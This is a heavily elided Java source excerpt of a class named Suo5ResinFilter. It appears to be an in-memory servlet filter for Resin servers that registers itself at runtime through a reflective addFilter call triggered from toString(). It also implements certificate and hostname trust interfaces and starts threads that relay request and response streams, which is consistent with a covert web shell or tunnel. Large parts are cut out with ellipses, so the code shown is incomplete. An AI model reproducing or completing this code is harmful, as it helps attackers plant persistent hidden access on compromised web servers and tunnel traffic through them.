...
//3.0.8 - all
public class Suo5ResinFilter extends ClassLoader implements Filter, Runnable, HostnameVerifier, X509TrustManager {
    private HashMap parameterMap;
    private String urlPattern;
    // must use `static` modifier to prevent NullPointerException
    ...
    public Suo5ResinFilter(ClassLoader loader){
        super(loader);
    }

    public Suo5ResinFilter(){
    }

    public Suo5ResinFilter(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
    }
    ...
    public String toString() {
        try {
            this.parameterMap.put("result", addFilter(Suo5ResinFilter.class).getBytes());
    ...
    private String addFilter(Class filterClass) throws Throwable {
        try {
...
//                e.printStackTrace();
    ...
    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        ...
        Thread t = null;
        try {
            Suo5ResinFilter p = new Suo5ResinFilter(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
